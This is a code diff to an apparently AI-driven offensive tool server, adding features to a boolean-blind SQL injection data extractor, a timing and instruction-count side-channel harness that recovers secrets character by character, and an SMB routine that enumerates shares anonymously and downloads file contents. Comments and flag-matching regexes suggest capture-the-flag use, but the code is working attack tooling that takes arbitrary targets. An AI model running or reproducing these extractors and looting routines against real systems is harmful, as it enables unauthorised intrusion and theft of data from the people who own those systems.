@@ -16346,13 +16346,20 @@ def compression_oracle():
 
 @app.route("/api/tools/sqli-order-oracle", methods=["POST"])
 def sqli_order_oracle():
-    """Boolean-blind SQLi extractor using ORDER BY / CASE WHEN — covers the variant blind_sqli_extractor misses (hexfix §3 — ORDER ORDER)"""
+    """Boolean-blind SQLi extractor (ORDER BY / CASE WHEN) — the in-response boolean variant that
+    blind_sqli_extractor misses (hexfix §3 — ORDER ORDER).
+
+    SCOPE: the TRUE/FALSE signal must be observable IN the HTTP response (a marker substring, or an HTTP
+    status code via true_status). NOT for UNION-based, second-order (stored, fired later), or out-of-band
+    output (e.g. a CSV download) injection — for those use sqlmap_scan (--second-order / --technique=U).
+    """
     try:
         params = request.json
         url = params.get("url", "")
         param = params.get("param", "")
         method = params.get("method", "GET").upper()
         true_marker = params.get("true_marker", "")        # substring present only on TRUE responses
+        true_status = int(params.get("true_status", 0))    # OR: HTTP status code that indicates TRUE
         template = params.get("template", "1 ORDER BY (CASE WHEN ({cond}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)")
         query = params.get("query", "substr((SELECT group_concat(flag) FROM flags),{pos},1)")
         compare = params.get("compare") or "ascii({expr})>{val}"   # per-DB; SQLite: "unicode({expr})>{val}"
@@ -16361,8 +16368,8 @@ def sqli_order_oracle():
 
         if not url or not param:
             return jsonify({"error": "url and param parameters are required"}), 400
-        if not true_marker:
-            return jsonify({"error": "true_marker is required (a string that appears only on TRUE responses)"}), 400
+        if not true_marker and not true_status:
+            return jsonify({"error": "provide true_marker (substring on TRUE) or true_status (HTTP status code on TRUE)"}), 400
 
         def truth(cond):
             inj = template.format(cond=cond)
@@ -16372,6 +16379,8 @@ def sqli_order_oracle():
                     r = requests.post(url, data=payload, timeout=10, verify=False)
                 else:
                     r = requests.get(url, params=payload, timeout=10, verify=False)
+                if true_status:
+                    return r.status_code == true_status
                 return true_marker in r.text
             except Exception:
                 return False
@@ -16393,7 +16402,7 @@ def sqli_order_oracle():
                 break
         result = {"success": bool(extracted), "url": url, "param": param,
                   "extracted": extracted, "length": len(extracted),
-                  "note": "Defaults are MySQL-style; for SQLite pass compare='unicode({expr})>{val}'. Tune template=/query=/compare= per DB."}
+                  "note": "Boolean-blind ORDER BY only (signal must be IN the HTTP response). Defaults MySQL-style; SQLite: compare='unicode({expr})>{val}'. For UNION / second-order / CSV-output injection use sqlmap_scan instead."}
         logger.info(f"🧪 ORDER BY blind SQLi extracted {len(extracted)} chars from {url}")
         return jsonify(result)
     except Exception as e:
@@ -16402,11 +16411,17 @@ def sqli_order_oracle():
 
 @app.route("/api/tools/timing-oracle", methods=["POST"])
 def timing_oracle():
-    """Timing side-channel harness: recover a secret char-by-char by response time (hexfix §3 — SideChannel)"""
+    """Timing / instruction-count side-channel harness: recover a secret char-by-char (hexfix §3 — SideChannel).
+
+    metric='time' (high-res wall-clock via perf_counter — remote HTTP or a local command) or
+    'instructions' (perf stat -e instructions:u on a local command — deterministic, noise-free; far cleaner
+    for local-binary char-compare leaks). Picks the highest-signal candidate per position.
+    """
     try:
-        import time as _time, statistics, shlex
+        import time as _time, statistics, shlex, shutil
         params = request.json
         mode = params.get("mode", "http")               # http or command
+        metric = params.get("metric", "time")            # time | instructions (instructions => perf, command mode)
         url = params.get("url", "")
         param = params.get("param", "pin")
         method = params.get("method", "POST").upper()
@@ -16414,49 +16429,79 @@ def timing_oracle():
         charset = params.get("charset", "0123456789")
         known_prefix = params.get("known_prefix", "")
         max_len = int(params.get("max_len", 8))
-        samples = int(params.get("samples", 5))
+        samples = int(params.get("samples", 25))
         extra_data = params.get("data", {}) or {}
 
         if mode == "http" and not url:
             return jsonify({"error": "url is required for mode=http"}), 400
         if mode == "command" and not command_template:
             return jsonify({"error": "command_template (with a {guess} placeholder) is required for mode=command"}), 400
+        if metric == "instructions":
+            if mode != "command":
+                return jsonify({"error": "metric=instructions requires mode=command (perf runs the local command)"}), 400
+            if not shutil.which("perf"):
+                return jsonify({"success": False, "error": "metric=instructions needs 'perf' on PATH (linux-perf); install it / allow it (sysctl kernel.perf_event_paranoid=-1), or use metric=time"}), 200
+
+        def _run_cmd_time(guess):
+            t0 = _time.perf_counter()
+            execute_command(command_template.replace("{guess}", shlex.quote(guess)), use_cache=False)
+            return _time.perf_counter() - t0
+
+        def _run_http_time(guess):
+            payload = dict(extra_data); payload[param] = guess
+            t0 = _time.perf_counter()
+            try:
+                if method == "POST":
+                    requests.post(url, data=payload, timeout=10, verify=False)
+                else:
+                    requests.get(url, params=payload, timeout=10, verify=False)
+            except Exception:
+                pass
+            return _time.perf_counter() - t0
+
+        def _run_instr(guess):
+            cmd = "perf stat -x, -e instructions:u " + command_template.replace("{guess}", shlex.quote(guess))
+            r = execute_command(cmd, use_cache=False)
+            txt = (r.get("stderr", "") or "") + "\n" + (r.get("stdout", "") or "")
+            for line in txt.splitlines():
+                if "instructions" in line:
+                    f0 = line.split(",")[0].strip()
+                    if f0.replace(".", "").isdigit():
+                        return int(float(f0))
+            return -1
 
         def measure(guess):
-            times = []
-            for _ in range(samples):
-                t0 = _time.time()
-                if mode == "http":
-                    payload = dict(extra_data); payload[param] = guess
-                    try:
-                        if method == "POST":
-                            requests.post(url, data=payload, timeout=10, verify=False)
-                        else:
-                            requests.get(url, params=payload, timeout=10, verify=False)
-                    except Exception:
-                        pass
-                else:
-                    execute_command(command_template.replace("{guess}", shlex.quote(guess)), use_cache=False)
-                times.append(_time.time() - t0)
-            return statistics.median(times)
+            # one untimed warmup (process spawn / linker / cache), then sample
+            if metric == "instructions":
+                _run_instr(guess)
+                vals = [v for v in (_run_instr(guess) for _ in range(max(3, samples // 4))) if v >= 0]
+                return statistics.median(vals) if vals else -1
+            runner = _run_http_time if mode == "http" else _run_cmd_time
+            runner(guess)  # warmup
+            vals = [runner(guess) for _ in range(samples)]
+            return min(vals) if vals else 0.0   # min = least scheduler/I-O noise for additive timing
 
         recovered = known_prefix
         per_position = []
         for _ in range(max_len):
-            best_ch, best_t, timings = None, -1.0, {}
+            best_ch, best_v, scores = None, None, {}
             for ch in charset:
-                t = measure(recovered + ch)
-                timings[ch] = round(t, 4)
-                if t > best_t:
-                    best_t, best_ch = t, ch
-            per_position.append(timings)
+                v = measure(recovered + ch)
+                scores[ch] = (round(v, 6) if metric == "time" else v)
+                if best_v is None or v > best_v:
+                    best_v, best_ch = v, ch
+            per_position.append(scores)
             if best_ch is None:
                 break
             recovered += best_ch
-        result = {"success": bool(recovered != known_prefix), "mode": mode,
-                  "recovered": recovered, "per_position_timings": per_position,
-                  "note": "Picks the slowest candidate per position (early-abort compare leak). Raise 'samples' on noisy targets."}
-        logger.info(f"⏱️ Timing-oracle recovered candidate: {recovered}")
+        result = {"success": bool(recovered != known_prefix), "mode": mode, "metric": metric,
+                  "recovered": recovered, "per_position_scores": per_position,
+                  "note": ("Picks the highest-signal candidate per position (more matching prefix -> longer "
+                           "compare / more instructions before reject). For local-binary ns-scale leaks use "
+                           "metric=instructions (perf — deterministic, immune to spawn/I-O noise). metric=time "
+                           "uses perf_counter + warmup + min-of-samples, but wall-clock still buries ns-scale "
+                           "compares, so raise samples (50-100) on noisy targets.")}
+        logger.info(f"⏱️ Timing-oracle ({mode}/{metric}) recovered: {recovered}")
         return jsonify(result)
     except Exception as e:
         logger.error(f"💥 Error in timing_oracle endpoint: {str(e)}")
@@ -16483,27 +16528,96 @@ def smb_ipp_exploit():
         t_q = shlex.quote(target)
         result = {"success": False, "target": target, "service": service, "action": action, "commands": []}
 
+        MAX_SHARES, MAX_FILES, MAX_FILE_BYTES, MAX_TOTAL_BYTES, TRUNC = 10, 25, 100000, 200000, 4000
+        flag_re = re.compile(r'(?:pico)?CTF\{[^}\r\n]{1,120}\}|flag\{[^}\r\n]{1,120}\}', re.IGNORECASE)
+        flags = set()
+
         def run(label, cmd):
             result["commands"].append(cmd)
             r = execute_command(cmd, use_cache=False)
-            result[label] = r.get("stdout", "")
-            if r.get("success", False):
-                result["success"] = True
+            out = r.get("stdout", "") or ""
+            result[label] = out
+            flags.update(flag_re.findall(out))
+            return r
+
+        def parse_share_names(text):
+            # pull 'Disk'/'Printer' shares from a `smbclient -L` table; skip IPC$/admin ($) shares
+            names = []
+            for line in text.splitlines():
+                m = re.match(r'^\s*(\S+)\s+(Disk|Printer)\s', line)
+                if m and not m.group(1).endswith("$") and m.group(1).lower() not in ("ipc$", "print$"):
+                    names.append(m.group(1))
+            return names
+
+        def parse_smb_files(text):
+            # walk `recurse ON; ls` output -> [(relpath, size)] for files (tracks \subdir headers, skips dirs/./..)
+            files, curdir = [], ""
+            for line in text.splitlines():
+                m = re.match(r'^\s+(.+?)\s+([DAHSRN]+)\s+(\d+)\s+(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\b', line)
+                if m:
+                    name, attrs, size = m.group(1).strip(), m.group(2), int(m.group(3))
+                    if name in (".", "..") or "D" in attrs:
+                        continue
+                    files.append(((curdir + "\\" + name) if curdir else name, size))
+                elif line.startswith("\\"):
+                    curdir = line.strip().lstrip("\\")
+            return files
 
         if service in ("smb", "auto"):
+            smb_port = str(port) if port else ""           # SMB on a non-standard port (e.g. Printer Shares)
+            auth = f"-U {shlex.quote(username + '%' + password)}" if username else "-N"
+            pflag = f" -p {shlex.quote(smb_port)}" if smb_port else ""
+
+            # best-effort richer enum (READ/WRITE perms). May die with STATUS_USER_SESSION_DELETED on modern
+            # Samba — informational only; we never let its failure suppress the smbclient path below.
             nxc = next((b for b in ("nxc", "netexec", "crackmapexec") if shutil.which(b)), "")
             if nxc:
                 cmd = f"{nxc} smb {t_q} --shares"
+                if smb_port:
+                    cmd += f" --port {shlex.quote(smb_port)}"
                 if username:
                     cmd += f" -u {shlex.quote(username)} -p {shlex.quote(password)}"
                 run("smb_enum", cmd)
-            elif shutil.which("smbclient"):
-                auth = f"-U {shlex.quote(username + '%' + password)}" if username else "-N"
-                run("smb_shares", f"smbclient -L {t_q} {auth}")
-            if share and shutil.which("smbclient"):
-                auth = f"-U {shlex.quote(username + '%' + password)}" if username else "-N"
-                unc = shlex.quote(f"//{target}/{share}")
-                run("smb_get", f"smbclient {unc} {auth} -c {shlex.quote('recurse ON; ls')}")
+
+            # canonical share list via smbclient (reliable with null/guest); always run + parse regardless of nxc
+            if shutil.which("smbclient"):
+                run("smb_shares", f"smbclient -L {t_q} {auth}{pflag}")
+                discovered = parse_share_names(result.get("smb_shares", ""))
+                result["shares_found"] = discovered
+
+                # auto-loot: descend each Disk share, list recursively, and READ small files (contents, not just
+                # names) — the flag is usually a file *inside* a share, not the share listing itself.
+                do_loot = action not in ("list", "shares")
+                targets = ([share] if share else discovered)[:MAX_SHARES]
+                loot, total = {}, 0
+                for sh in (targets if do_loot else []):
+                    if not re.match(r'^[\w.$ -]+$', sh):       # whitelist server-supplied share names
+                        continue
+                    unc = shlex.quote(f"//{target}/{sh}")
+                    ls_cmd = f"smbclient {unc} {auth}{pflag} -c {shlex.quote('recurse ON; ls')}"
+                    result["commands"].append(ls_cmd)
+                    listing = execute_command(ls_cmd, use_cache=False).get("stdout", "") or ""
+                    flags.update(flag_re.findall(listing))
+                    entry = {"listing": listing[:TRUNC], "files": {}}
+                    if "NT_STATUS" in listing:                 # e.g. ACCESS_DENIED -> tells the model to find creds
+                        entry["status"] = next((l.strip() for l in listing.splitlines() if "NT_STATUS" in l), "")
+                    for relpath, size in parse_smb_files(listing):
+                        if len(entry["files"]) >= MAX_FILES or total >= MAX_TOTAL_BYTES:
+                            break
+                        if size > MAX_FILE_BYTES or any(c in relpath for c in (';', '"', '`', '\n', '\r')):
+                            continue
+                        get_cmd = f"smbclient {unc} {auth}{pflag} -c {shlex.quote('get ' + chr(34) + relpath + chr(34) + ' -')}"
+                        result["commands"].append(get_cmd)
+                        content = execute_command(get_cmd, use_cache=False).get("stdout", "") or ""
+                        if content.startswith("getting file"):     # drop smbclient's transfer banner if on stdout
+                            content = content.split("\n", 1)[-1]
+                        if content.strip():
+                            total += len(content)
+                            flags.update(flag_re.findall(content))
+                            entry["files"][relpath] = content[:TRUNC]
+                    loot[sh] = entry
+                if loot:
+                    result["smb_loot"] = loot
 
         if service in ("ipp", "auto"):
             ipp_port = str(port) if port else "631"
@@ -16514,7 +16628,13 @@ def smb_ipp_exploit():
         if additional_args:
             run("additional", f"{additional_args} {t_q}")
 
-        logger.info(f"🖨️ SMB/IPP run against {target}")
+        # honest success: we actually retrieved file content or a flag — NOT merely "a subprocess exited 0"
+        if flags:
+            result["flag_candidates"] = sorted(flags)
+        result["success"] = bool(flags) or any(e.get("files") for e in result.get("smb_loot", {}).values())
+
+        logger.info(f"🖨️ SMB/IPP {'FLAG' if flags else 'run'} vs {target} "
+                    f"(shares={len(result.get('shares_found', []))}, looted={sum(len(e.get('files', {})) for e in result.get('smb_loot', {}).values())})")
         return jsonify(result)
     except Exception as e:
         logger.error(f"💥 Error in smb_ipp_exploit endpoint: {str(e)}")
